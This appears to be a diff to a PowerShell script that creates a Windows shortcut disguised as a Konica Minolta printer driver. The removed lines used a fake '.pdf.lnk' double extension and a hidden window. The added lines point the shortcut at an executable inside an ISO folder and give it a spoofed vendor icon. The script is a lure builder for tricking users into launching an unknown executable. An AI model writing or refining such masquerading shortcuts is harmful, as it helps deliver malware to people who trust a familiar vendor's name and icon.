@@ -1,7 +1,7 @@
 param(
-    [string]$ExePath = "konica_minolta_printer-driver-update.exe",
-    [string]$OutputPath = "Konica_Minolta_Universal_Printer_Driver_v2.3.1.pdf.lnk",
-    [string]$IconPath = "",
+    [string]$ExePath = "isodir\setup.exe",
+    [string]$OutputPath = "Konica_Minolta_Universal_Printer_Driver_v2.3.1.lnk",
+    [string]$IconPath = "isodir\KM_Icon.ico",
     [string]$Description = "Konica Minolta Universal Printer Driver v2.3.1",
     [string]$WorkingDir = ""
 )
@@ -11,10 +11,13 @@ $shortcut = $shell.CreateShortcut((Resolve-Path $OutputPath -ErrorAction Silentl
 
 $shortcut.TargetPath = $ExePath
 $shortcut.Description = $Description
-$shortcut.WindowStyle = 7
+$shortcut.WindowStyle = 1
 
 if ($IconPath -ne "" -and (Test-Path $IconPath)) {
     $shortcut.IconLocation = $IconPath
+} else {
+    # Try to extract icon from the exe itself
+    $shortcut.IconLocation = "$ExePath,0"
 }
 
 if ($WorkingDir -ne "") {
@@ -24,8 +27,8 @@ if ($WorkingDir -ne "") {
 }
 
 $shortcut.Save()
-Write-Host "[+] LNK: $OutputPath"
+Write-Host "[+] LNK created: $OutputPath"
 Write-Host "    Target: $ExePath"
-Write-Host "    Hidden: Yes (WindowStyle=7)"
+Write-Host "    Description: $Description"
 $bytes = [System.IO.File]::ReadAllBytes($OutputPath)
 Write-Host "    Size: $($bytes.Length) bytes"
